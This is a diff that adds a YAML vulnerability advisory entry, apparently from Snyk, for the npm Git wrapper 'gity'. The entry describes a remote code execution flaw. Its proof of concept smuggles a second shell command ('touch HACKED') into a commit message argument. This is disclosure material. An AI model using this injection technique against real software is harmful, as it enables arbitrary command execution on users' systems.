@@ -1,0 +1,28 @@
+---
+- id: snykio:npm:gity:1012730
+  title: Remote Code Execution (RCE)
+  description: "[gity][1] is a Git wrapper for Node.\n\nAffected versions of this
+    package are vulnerable to Remote Code\nExecution (RCE). A user input is formatted
+    inside a command that will be\nexecuted without any check.\n\n### PoC by mik317
+    \  {#poc-by-mik317}\n\n* Create the following PoC file:\n      // poc.js\n      var
+    Git = require('gity');\n\nvar git = Git() .add(\\'\\*.js\\') .commit(\\'-m \\\"added
+    js files\\\";touch\nHACKED;#\\') .run();\n\n    \n    * Check there aren't files
+    called `HACKED`\n    * Execute the following commands in another terminal:\n\nnpm
+    i gity # Install affected module node poc.js # Run the PoC\n\n    * Recheck the
+    files: now `HACKED` has been created\n    ## Remediation\n    There is no fixed
+    version for `gity`.\n    ## References\n    - [HackerOne Report](https://hackerone.com/reports/730111)\n
+    \   - [Vulnerable Code](https://hackerone.com/redirect?signature=83666e53042da3c66e97c9afe213f17e5c0d75b0&url=https%3A%2F%2Fgithub.com%2Fstevenmiller888%2Fgity%2Fblob%2Fmaster%2Flib%2Findex.js%23L85)\n\n\n\n[1]:
+    https://www.npmjs.com/package/gity\n"
+  affected_package: gity
+  vulnerable_versions:
+  - "*"
+  severity: medium
+  package_manager: npm
+  cwe:
+  - CWE-94
+  disclosed_date: 2020-09-24
+  created_date: 2020-09-25
+  last_modified_date: 2020-09-25
+  credit:
+  - mik317
+  source_url: https://snyk.io/vuln/SNYK-JS-GITY-1012730
